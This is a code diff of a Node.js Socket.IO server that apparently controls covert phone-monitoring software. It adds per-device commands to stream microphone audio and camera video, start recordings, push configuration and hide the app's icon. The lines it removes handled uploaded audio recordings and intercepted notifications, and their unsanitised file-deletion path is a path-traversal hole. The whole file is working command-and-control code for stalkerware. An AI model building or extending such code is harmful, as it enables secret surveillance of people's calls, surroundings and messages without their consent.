@@ -72,82 +72,154 @@ app.get('/api/info', (req, res) => {
   });
 });
 
+// Device Management
+const devices = new Map(); // deviceId -> { socketId, name, state }
+
 io.on('connection', (socket) => {
-  console.log('New Client Connected');
+  const type = socket.handshake.query.type;
 
-  // Emit to web client for visibility
-  io.emit('log', 'New Client Connected: ' + socket.id);
+  if (type === 'device') {
+    const deviceId = socket.handshake.query.deviceId;
+    const name = socket.handshake.query.name || 'Unknown Device';
 
-  socket.on('disconnect', () => {
-    console.log('Client Disconnected');
-    io.emit('log', 'Client Disconnected: ' + socket.id);
-  });
+    console.log(`📱 Device Connected: ${name} (${deviceId})`);
 
-  // Handle Audio Stream
+    devices.set(deviceId, {
+      socketId: socket.id,
+      name: name,
+      connectedAt: new Date()
+    });
+
+    // Notify admins
+    socket.broadcast.emit('device_list_update', Array.from(devices.entries()));
+
+    socket.on('disconnect', () => {
+      console.log(`📱 Device Disconnected: ${name}`);
+      devices.delete(deviceId);
+      socket.broadcast.emit('device_list_update', Array.from(devices.entries()));
+    });
+  } else {
+    console.log('💻 Admin Dashboard Connected');
+    // Send current list immediately
+    socket.emit('device_list_update', Array.from(devices.entries()));
+
+    socket.on('disconnect', () => {
+      console.log('💻 Admin Disconnected');
+    });
+  }
+
+
+  // Handle Audio Stream (from device)
   socket.on('audio_stream', (data) => {
-    // Broadcast to web clients
-    io.emit('audio_data', data);
+    // Attach deviceId so frontend knows who sent it
+    const deviceId = getDeviceIdBySocketId(socket.id);
+    if (deviceId) {
+      io.emit('audio_data', { deviceId, data });
+    }
   });
 
   // Handle Video Stream
   socket.on('video_frame', (data) => {
-    io.emit('video_data', data);
+    const deviceId = getDeviceIdBySocketId(socket.id);
+    if (deviceId) {
+      io.emit('video_data', { deviceId, data });
+    }
   });
+
 
   // Handle Status Updates
   socket.on('status_update', (status) => {
     io.emit('server_log', 'App Status: ' + status); // Relay as log
   });
 
-  // Commands from web dashboard
-  socket.on('get_status', () => {
-    socket.broadcast.emit('GET_STATUS');
+  // Helper to send to specific device
+  const sendToDevice = (targetId, event, data = null) => {
+    const device = devices.get(targetId);
+    if (device && device.socketId) {
+      io.to(device.socketId).emit(event, data);
+    }
+  };
+
+  // Commands from web dashboard (now with targetId)
+  socket.on('get_status', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'GET_STATUS');
+    else socket.broadcast.emit('GET_STATUS'); // Fallback for old clients
   });
 
-  socket.on('start_monitoring', () => {
-    socket.broadcast.emit('START_AUDIO');
+  socket.on('start_monitoring', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'START_AUDIO');
+    else socket.broadcast.emit('START_AUDIO');
   });
 
-  socket.on('stop_monitoring', () => {
-    socket.broadcast.emit('STOP_AUDIO');
+  socket.on('stop_monitoring', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'STOP_AUDIO');
+    else socket.broadcast.emit('STOP_AUDIO');
   });
 
-  socket.on('start_video', () => {
-    socket.broadcast.emit('START_CAM');
+  socket.on('start_video', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'START_CAM');
+    else socket.broadcast.emit('START_CAM');
   });
 
-  socket.on('stop_video', () => {
-    socket.broadcast.emit('STOP_CAM');
+  socket.on('stop_video', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'STOP_CAM');
+    else socket.broadcast.emit('STOP_CAM');
   });
 
-  socket.on('switch_camera', () => {
-    socket.broadcast.emit('SWITCH_CAM');
+  socket.on('switch_camera', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'SWITCH_CAM');
+    else socket.broadcast.emit('SWITCH_CAM');
   });
 
-  socket.on('toggle_flash', () => {
-    socket.broadcast.emit('TOGGLE_FLASH');
+  socket.on('toggle_flash', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'TOGGLE_FLASH');
+    else socket.broadcast.emit('TOGGLE_FLASH');
   });
 
-  socket.on('brightness_up', () => {
-    socket.broadcast.emit('BRIGHTNESS_UP');
+  socket.on('brightness_up', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'BRIGHTNESS_UP');
+    else socket.broadcast.emit('BRIGHTNESS_UP');
   });
 
-  socket.on('brightness_down', () => {
-    socket.broadcast.emit('BRIGHTNESS_DOWN');
+  socket.on('brightness_down', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'BRIGHTNESS_DOWN');
+    else socket.broadcast.emit('BRIGHTNESS_DOWN');
+  });
+
+  socket.on('START_MANUAL_RECORDING', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'START_MANUAL_RECORDING');
+  });
+
+  socket.on('STOP_MANUAL_RECORDING', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'STOP_MANUAL_RECORDING');
   });
 
   // Remote config management
-  socket.on('update_config', (config) => {
-    console.log('[Server] Config update:', config);
-    socket.broadcast.emit('UPDATE_CONFIG', config);
+  socket.on('update_config', (data) => {
+    // data = { targetId, config }
+    console.log('[Server] Config update:', data);
+    if (data.targetId) {
+      sendToDevice(data.targetId, 'UPDATE_CONFIG', data.config);
+    } else {
+      // Fallback or broadcast
+      socket.broadcast.emit('UPDATE_CONFIG', data);
+    }
   });
 
-  socket.on('get_config', () => {
-    socket.broadcast.emit('GET_CONFIG');
+  socket.on('get_config', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'GET_CONFIG');
   });
 
-  socket.on('get_storage_stats', () => {
-    socket.broadcast.emit('GET_STORAGE_STATS');
+  socket.on('get_storage_stats', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'GET_STORAGE_STATS');
+  });
+
+  socket.on('hide_app_icon', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'HIDE_APP_ICON');
+  });
+
+  socket.on('show_app_icon', (targetId) => {
+    if (targetId) sendToDevice(targetId, 'SHOW_APP_ICON');
   });
 
   socket.on('current_config', (config) => {
@@ -158,118 +230,36 @@ io.on('connection', (socket) => {
     socket.broadcast.emit('storage_stats', stats);
   });
 
-  // Handle Offline Audio File Uploads
-  socket.on('upload_audio_file', (filename, data) => {
-    // payload: { filename: "audio_123.pcm", data: Buffer }
-    console.log(`[Server] Receiving file: ${filename}`);
-    try {
-      const timestamp = new Date().getTime();
-      const safeName = (filename || `audio_${timestamp}`).replace(/[^a-z0-9._-]/gi, '_');
-      const pcmData = data; // Raw buffer
-
-      if (!pcmData) {
-        console.error("[Server] No data received for file");
-        return;
-      }
-
-      // Convert PCM to WAV
-      const wavHeader = createWavHeader(pcmData.length);
-      const wavBuffer = Buffer.concat([wavHeader, pcmData]);
-
-      // Save as .wav
-      const wavName = safeName.replace('.pcm', '') + '.wav';
-      const filePath = path.join(uploadsDir, wavName);
-
-      fs.writeFile(filePath, wavBuffer, (err) => {
-        if (err) {
-          console.error("Error saving file:", err);
-        } else {
-          console.log(`[Server] Saved recording: ${wavName}`);
-          // Notify dashboard to refresh list if open
-          io.emit('new_recording', { name: wavName, size: wavBuffer.length, date: new Date().toISOString() });
-        }
-      });
-    } catch (e) {
-      console.error("Error handling upload:", e);
-    }
-  });
-
-  socket.on('get_recordings_list', () => {
-    fs.readdir(uploadsDir, (err, files) => {
-      if (err) return;
-      const recordings = files
-        .filter(f => f.endsWith('.wav'))
-        .map(f => {
-          const stats = fs.statSync(path.join(uploadsDir, f));
-          return {
-            name: f,
-            size: stats.size,
-            date: stats.mtime.toISOString()
-          };
-        })
-        .sort((a, b) => new Date(b.date) - new Date(a.date)); // Newest first
-
-      socket.emit('recordings_list', recordings);
-    });
-  });
-
-  socket.on('delete_recording', (filename) => {
-    const filePath = path.join(uploadsDir, filename);
-    if (fs.existsSync(filePath)) {
-      fs.unlink(filePath, (err) => {
-        if (!err) {
-          io.emit('recording_deleted', filename);
-        }
-      });
-    }
-  });
-
-
-
-  // App icon control
-  socket.on('hide_app_icon', () => {
-    console.log('[Server] Hide app icon requested');
-    socket.broadcast.emit('HIDE_APP_ICON');
-  });
-
-  socket.on('show_app_icon', () => {
-    console.log('[Server] Show app icon requested');
-    socket.broadcast.emit('SHOW_APP_ICON');
-  });
-
-  // Permission alerts
-  socket.on('permission_revoked', (permissionName) => {
-    console.log(`[Server] Permission revoked: ${permissionName}`);
-    socket.broadcast.emit('permission_alert', permissionName);
-  });
-
-  // Notification monitoring
-  socket.on('notification_posted', (notification) => {
-    console.log(`[Server] Notification: ${JSON.parse(notification).title}`);
-    socket.broadcast.emit('live_notification', notification);
-  });
-
-  socket.on('offline_notifications', (notifications) => {
-    console.log(`[Server] Received offline notifications`);
-    socket.broadcast.emit('offline_notifications_received', notifications);
-  });
-
   // ============= WebRTC Signaling Pass-Through =============
-  socket.on('webrtc_offer', (offer) => {
-    console.log('[Server] WebRTC offer received, broadcasting...');
-    socket.broadcast.emit('webrtc_offer', offer);
+  // Modified to route to specific device or admin
+  socket.on('webrtc_offer', (data) => { // data = { targetId, offer } OR just offer
+    const payload = typeof data === 'string' ? JSON.parse(data) : data;
+    // If from admin to device
+    if (payload.targetId) {
+      sendToDevice(payload.targetId, 'webrtc_offer', JSON.stringify(payload.offer || payload));
+    } else {
+      // From device to admin
+      socket.broadcast.emit('webrtc_offer', data);
+    }
   });
 
-  socket.on('webrtc_answer', (answer) => {
-    console.log('[Server] WebRTC answer received, broadcasting...');
-    socket.broadcast.emit('webrtc_answer', answer);
+  socket.on('webrtc_answer', (data) => {
+    // Typically from device to admin
+    socket.broadcast.emit('webrtc_answer', data);
   });
 
-  socket.on('webrtc_ice_candidate', (candidate) => {
-    console.log('[Server] WebRTC ICE candidate received, broadcasting...');
-    socket.broadcast.emit('webrtc_ice_candidate', candidate);
+  socket.on('webrtc_ice_candidate', (data) => {
+    // Relay blindly for now, usually fine in simple p2p
+    socket.broadcast.emit('webrtc_ice_candidate', data);
   });
 });
+
+function getDeviceIdBySocketId(socketId) {
+  for (let [id, device] of devices.entries()) {
+    if (device.socketId === socketId) return id;
+  }
+  return null;
+}
 
 const PORT = process.env.PORT || 3000;
 const NODE_ENV = process.env.NODE_ENV || 'development';
